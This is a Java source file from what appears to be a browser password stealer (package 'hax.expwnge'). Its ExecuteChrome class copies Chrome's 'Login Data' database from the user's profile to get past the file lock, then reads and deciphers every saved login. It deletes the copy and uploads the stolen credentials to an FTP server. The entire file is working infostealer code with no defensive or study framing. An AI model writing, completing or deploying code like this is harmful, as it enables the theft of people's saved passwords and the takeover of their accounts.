package hax.expwnge.processing.impl.actions;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Date;
import java.util.List;
import java.util.logging.Logger;

import org.springframework.beans.factory.annotation.Autowired;

import hax.expwnge.dao.LoginDAO;
import hax.expwnge.models.Login;
import hax.expwnge.models.Login.Table;
import hax.expwnge.models.ProcessingContext;
import hax.expwnge.processing.api.ExecuteAction;
import hax.expwnge.utils.FTPUtils;
import static hax.expwnge.models.Login.LOGIN_TABLE_FACTORY;

public class ExecuteChrome implements ExecuteAction<ProcessingContext> {
  @Autowired
  private LoginDAO loginDAO;
  private static final Logger LOGGER = Logger.getLogger(ExecuteChrome.class);
  
  @Override
  public ProcessingContext execute(ProcessingContext processingContext) {
    String chromeFolder = System.getenv("LOCALAPPDATA")+"/Google/Chrome/User Data/Default/";
    
    /** Copy file to dance around database file lock **/
    Path resultPath = null;
    try {
      resultPath = Files.copy(Paths.get(chromeFolder+"Login Data"), Paths.get(chromeFolder+"MyData Copy"), StandardCopyOption.REPLACE_EXISTING);
    } catch (Exception e) {
      LOGGER.error(e);
    }

    /** Read and decipher all login details **/
    List<Login> logins = loginDAO.getLoginDetails(resultPath);
    
    /** Delete the database copy **/
    try {
      Files.delete(resultPath);
    } catch (Exception e) {
      LOGGER.error(e);
    }
//
//    /** Store formatted data **/
//    try {
//      Files.write(Paths.get("expwnged.txt"), LOGIN_TABLE_FACTORY.new Table(logins).getContent(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
//    } catch (Exception e) {
//      LOGGER.error(e);
//    }
    
    if(processingContext.getFtpCreds().isEnabled()) {
      FTPUtils.storeFile(processingContext.getFtpCreds(), processingContext.getFileName()+"_chrome"+new Date(), LOGIN_TABLE_FACTORY.new Table(logins).getContentAsStream()); // + fileName (es. appendix_formattedDate + file InputStream
    }
    
    return processingContext;
  }

}
